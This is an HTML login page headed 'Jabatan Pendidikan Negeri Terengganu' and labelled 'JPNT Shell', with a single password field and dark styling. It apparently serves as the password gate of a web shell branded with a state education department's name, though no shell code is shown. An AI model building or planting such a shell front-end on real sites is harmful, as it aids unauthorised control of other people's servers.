<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>login</title>
  <link rel="stylesheet" href="ghost.css" />
  <style>
    body, html {
      height: 100%;
      margin: 0;
      font-family: 'Orbitron', sans-serif;
      background-color: var(--color-bg);
      color: var(--color-accent);
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .login-container {
      background-color: var(--color-bg-alt);
      padding: 2rem 3rem;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.7);
      width: 320px;
      text-align: center;
    }
    .login-container h1 {
      margin: 0 0 1rem 0;
      font-size: 2rem;
      color: var(--color-accent);
      letter-spacing: 0.1em;
    }
    .login-container h2 {
      margin: 0 0 2rem 0;
      font-weight: 400;
      font-size: 1.2rem;
      color: var(--color-text-secondary);
    }
    .login-container label {
      display: block;
      font-size: 1rem;
      margin-bottom: 0.5rem;
      color: var(--color-accent);
      letter-spacing: 0.05em;
    }
    .login-container input[type="password"] {
      width: 100%;
      padding: 0.75rem;
      font-size: 1rem;
      border-radius: 8px;
      border: 1px solid var(--color-input-border);
      background: var(--color-input-bg);
      color: var(--color-input-text);
      outline: none;
      transition: border-color 0.3s ease, box-shadow 0.3s ease;
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 1.5rem;
    }
    .login-container input[type="password"]:focus {
      border-color: var(--color-input-border-focus);
      box-shadow: 0 0 8px var(--color-input-border-focus);
    }
    .login-container button {
      width: 100%;
      padding: 0.75rem;
      font-size: 1.25rem;
      border-radius: 12px;
      border: none;
      background: var(--color-button-bg);
      color: var(--color-button-text);
      cursor: pointer;
      box-shadow: 0 2px 6px rgba(255, 204, 0, 0.4);
      transition: background-color 0.3s ease, color 0.3s ease;
      font-family: 'Orbitron', sans-serif;
    }
    .login-container button:hover {
      background: var(--color-button-bg-hover);
      color: var(--color-accent-hover);
      box-shadow: 0 4px 12px rgba(255, 214, 51, 0.7);
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>Jabatan Pendidikan Negeri Terengganu</h1>
    <h2>JPNT Shell</h2>
    <form action="" method="POST" autocomplete="off">
      <label for="password">Password</label>
      <input id="password" type="password" name="password" required />
      <button type="submit" name="login">Login</button>
    </form>
  </div>
</body>
</html>
